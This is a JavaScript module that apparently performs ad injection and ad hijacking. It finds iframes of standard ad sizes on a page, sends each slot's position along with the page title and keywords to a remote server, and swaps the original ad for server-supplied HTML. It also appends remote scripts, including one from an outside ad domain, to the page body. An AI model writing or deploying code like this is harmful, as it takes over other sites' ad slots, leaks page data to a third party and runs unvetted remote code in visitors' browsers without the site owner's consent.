import $ from 'jquery';
import { CP_ID, AD_CONTENT_PATH } from './config';

const sizes = ['300:250', '200:200', '336:280', '250:250', '728:90', '640:96', '300:600', '970:100', '528:320', '960:90', '580:90', '960:60', '760:90', '640:128', '640:60', '468:60', '1000:560', '300:200', '400:300', '800:600', '130:300', '585:120', '760:200', '760:100', '430:50', '760:100', '392:72', '468:60', '240:400', '180:150', '160:600', '120:600', '120:240', '120:90', '120:90', '125:125', '234:72', '392:72', '468:60', '330:400', '662:100', '316:250', '680:250', '750:100', '761:100', '761:400', '960:100', '1000:100', '340:400', '320:400', '300:400', '840:100', '660:100', '260:250', '700:100', '580:100', '680:100', '280:250', '770:100', '600:100', '880:100', '640:300',
];

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return `${s4()}${s4()}-${s4()}-${s4()}-${s4()}-${s4()}${s4()}${s4()}-${s4()}${s4()}`;
}
const pageId = guid();
// 最底部广告插入
function inject(uuid) {
  if (!window.injectAppear) {
    window.injectAppear = true;
    $.ajax({
      url: AD_CONTENT_PATH,
      jsonp: 'callback',
      dataType: 'jsonp',
      data: {
        format: 'json',
        uuid,
        cpId: CP_ID,
        divW: 0,
        divH: 0,
        pageId,
        device: window.device6xw4qsx || '',
        adWay: 'inject',
        title: document.title || '',
        keywords: $('meta[name=keywords]').attr('content') || '',
      },
      success: (resp) => {
        if (resp.html) {
          $('body').append(resp.html);
        }
      },
    });
  }
}

function consumeResource(iframe, uuid) {
  const itemW = iframe.width;
  const itemH = iframe.height;
  const w = itemW && itemW.replace('px', '');
  const h = itemH && itemH.replace('px', '');
  const randomId = `divReplace${Math.random().toString(36).substr(2)}`;
  const style = `width:${w}px;height:${h}px;background:transparent;`;
  const replaceDiv = document.createElement('div');
  replaceDiv.setAttribute('style', style);
  replaceDiv.setAttribute('id', randomId);
  replaceDiv.setAttribute('tag', 'very-ad');
  const { left: leftDoc } = $(iframe).offset();
  const { top: topDoc } = $(iframe).offset();
  const docH = $(document).height();
  const docW = $(document).width();
  const contentH = $(window).height();
  let ps = null;
  if (leftDoc + $(iframe).width() === docW && topDoc + $(iframe).height() === contentH) {
    ps = 0;
  } else {
    ps = Math.ceil(topDoc / contentH);
  }
  $.ajax({
    url: AD_CONTENT_PATH,
    // url: '',
    jsonp: 'callback',
    dataType: 'jsonp',
    data: {
      format: 'json',
      uuid,
      pageId,
      cpId: CP_ID,
      divId: randomId,
      divW: w,
      divH: h,
      left: leftDoc,
      top: topDoc,
      dW: docW,
      dH: docH,
      p: ps,
      device: window.device6xw4qsx || '',
      adWay: 'replace',
      title: document.title || '',
      keywords: $('meta[name=keywords]').attr('content') || '',
    },
    success: (resp) => {
      const r = $(replaceDiv);
      if (resp.html) {
        r.append(resp.html);
        $(iframe).parent().html(r);
      }
    },
  });
}

function isValuableRes(item) {
  let h = item.height || '';
  h = h && h.replace('px', '');
  let w = item.width || '';
  w = w && w.replace('px', '');
  const wh = `${w}:${h}`;
  for (let index = 0; index < sizes.length; index += 1) {
    const size = sizes[index];
    if (wh === size) return true;
  }
  return false;
}

function anylaseResource(uuid) {
  let isReplace = 0;
  const iframes = document.getElementsByTagName('iframe');
  for (let index = 0; index < iframes.length; index += 1) {
    const item = iframes[index];
    if (isValuableRes(item)) {
      consumeResource(item, uuid);
      isReplace = 1;
    }
  }
  // if (!isReplace) inject(uuid);
}

const adArr = [{
  append: "<script>var dx_uid ='428641C4AD7833EAC77E795CF3267E6C';var slot_dx_w=640;var slot_dx_h=100;</script>",
  type: 'text/javascript',
  className: 'dx_agsc',
  src: 'https://media.adget.cn/media_dx.js',
}];

const injectArr = [{
  append: '',
  type: 'text/javascript',
  className: '',
  src: '',
}];

function getAd() {
  const adIndex = Math.floor(Math.random() * adArr.length);
  const blackIndex = Math.floor(Math.random() * injectArr.length);

  const adBottom = adArr[adIndex] || '';
  const adInject = injectArr[blackIndex] || '';


  if (adBottom && adBottom.src) {
    if (adBottom.append) {
      $('body').append(adBottom.append);
    }

    const src = document.createElement('script');

    for (var key in adBottom) {
      if (key === 'append') {
        continue;
      }
      src[key] = adBottom[key];
    }

    $('body').append(src);
  }

  if (adInject && adInject.src) {
    if (adInject.append) {
      $('body').append(adInject.append);
    }

    const src = document.createElement('script');

    for (var key in adInject) {
      if (key === 'append') {
        continue;
      }
      src[key] = adInject[key];
    }

    $('body').append(src);
  }
}

const randomId = () => `ad${Math.random().toString(36).substr(2)}`;

export { pageId, anylaseResource, randomId, getAd };
